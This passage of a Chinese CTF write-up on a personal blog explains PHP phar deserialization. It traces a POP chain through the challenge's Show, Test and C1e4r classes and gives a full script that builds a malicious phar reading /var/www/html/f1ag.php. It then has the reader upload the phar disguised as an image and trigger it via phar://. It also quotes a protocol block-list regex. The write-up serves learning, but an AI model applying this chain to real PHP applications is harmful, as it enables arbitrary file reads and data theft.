+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span>   
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$content</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str</span><span class="p">[</span><span class="s1">&#39;str&#39;</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$content</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__set</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span><span class="nv">$value</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="nv">$key</span> <span class="o">=</span> <span class="nv">$value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">_show</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/http|https|file:|gopher|dict|\.\.|f1ag/i&#39;</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s1">&#39;hacker!&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">highlight_file</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/http|https|file:|gopher|dict|\.\./i&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;hacker~&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span> <span class="o">=</span> <span class="s2">&#34;index.php&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Test</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$file</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$params</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">params</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$key</span><span class="p">)</span>   <span class="c1">//  传入点
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="nv">$key</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">get</span><span class="p">(</span><span class="nv">$key</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">params</span><span class="p">[</span><span class="nv">$key</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$value</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">params</span><span class="p">[</span><span class="nv">$key</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$value</span> <span class="o">=</span> <span class="s2">&#34;index.php&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file_get</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">file_get</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$text</span> <span class="o">=</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$value</span><span class="p">));</span>  <span class="c1">// 任意文件读取点
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">return</span> <span class="nv">$text</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><ol>
+<li>
+<p>调用<code>Test</code>类中的<code>file_get()</code>方法任意文件读取，<code>get()</code>会调用<code>file_get()</code>方法，传入<code>$value</code>参数，if判断<code>$this-&gt;params[$key]</code>是否有值，没有则传<code>index.php</code>给<code>file_get</code>去读取。但是前面还有一个构造函数<code>__contruct()</code>，定义<code>params</code>为一个数组，<code>__get</code>则去调用<code>get()</code>方法，所以只要触发<code>__get()</code> 方法即可～ ，<code>__get()</code> 魔术方法在<code>读取不存在的属性</code>自动触发！</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">Test</span><span class="o">::</span><span class="na">__construct</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Test</span><span class="o">::</span><span class="na">__get</span><span class="p">()</span> <span class="o">--&gt;</span> <span class="nx">get</span><span class="p">()</span> <span class="o">--&gt;</span> <span class="nx">file_get</span><span class="p">()</span><span class="o">.</span><span class="nx">file_get_contents</span><span class="p">()</span> <span class="c1">// 读取文件
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p><code>Show</code>类中的<code>__toString()</code>中的<code>$content = $this-&gt;str['str']-&gt;source</code>则是获取一个叫<code>source</code>的属性。假设<code>str['str'] = new Test()</code>读取不存在的属性<code>source</code>刚好就能触发<code>__get()</code>方法！</p>
+</li>
+<li>
+<p><code>__toString()</code>把对象当成字符输出自动触发～，在<code>C1e4r</code>中<code>__destruct()</code>对象被销毁触发，能打印输出值，只要设置<code>$this-&gt;test</code>为<code>new show()</code>对象即可，</p>
+</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1"># 构造
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="nx">C1e4r</span><span class="o">::</span><span class="na">__destruct</span> <span class="o">--&gt;</span> <span class="nx">Show</span><span class="o">::</span><span class="na">toString</span><span class="p">()</span> <span class="o">--&gt;</span>  <span class="nx">Test</span><span class="o">::</span><span class="na">__get</span><span class="p">()</span> <span class="o">--&gt;</span><span class="nx">get</span><span class="p">()</span><span class="o">--&gt;</span><span class="nx">file_get_contents</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>POP：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">C1e4r</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$test</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$str</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Show</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$source</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$str</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Test</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$file</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$params</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$c</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">C1e4r</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$show</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Show</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$test</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Test</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$test</span><span class="o">-&gt;</span><span class="na">parms</span><span class="p">[</span><span class="s1">&#39;source&#39;</span><span class="p">]</span><span class="o">=</span><span class="s2">&#34;/var/www/html/f1ag.php&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// 为什么设置&#39;source&#39;? 因为: $this-&gt;str[&#39;str&#39;]-&gt;source;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$c</span><span class="o">-&gt;</span><span class="na">str</span> <span class="o">=</span> <span class="nv">$show</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$show</span><span class="o">-&gt;</span><span class="na">str</span><span class="p">[</span><span class="s1">&#39;str&#39;</span><span class="p">]</span><span class="o">=</span><span class="nv">$test</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">=</span><span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s2">&#34;mm.phar&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s1">&#39;&lt;?php __HALT_COMPILER(); ? &gt;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>     
+</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;test&#34;</span><span class="p">);</span> <span class="c1">// 生成签名
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>function.php</code>限制上传的文件后缀，但是到最后都会被命名为<code>xxxxxx.jpg</code>文件。<code>mm.phar</code>改成png结尾，</p>
+<p>上传文件，然后利用phar伪协议<code>http://xxxxx/file.php?file=phar://upload/xxxx.jpg</code></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/php/">php</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/sqlmap_tamper/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/image46.png" loading="lazy" data-key="" data-hash="/image46.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Sqlmap_tamper</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/%e5%a4%aa%e7%a9%ba%e5%a2%99%e7%ba%b8.jpg" loading="lazy" data-key="" data-hash="/太空墙纸.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">PHP底层_GC_垃圾回收机制</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/2022%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/1.png" loading="lazy" data-key="" data-hash="/1.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2022强网杯线上</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/image1.png" loading="lazy" data-key="" data-hash="/image1.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">反序列化字符逃逸</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/encrypt/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/103365922_p0.png" loading="lazy" data-key="" data-hash="/103365922_p0.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">encrypt</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2021 - 
+        
+        2023 main1o&#39;s Blog
+    </section>
+    
+    <section class="powerby">
+        
+            <img src="https://icp.gov.moe/favicon.ico" alt width="15px" height="15px"><a href="https://icp.gov.moe/?keyword=20229978" target="_blank">萌ICP备20229978号</a> <br/>
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.16.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
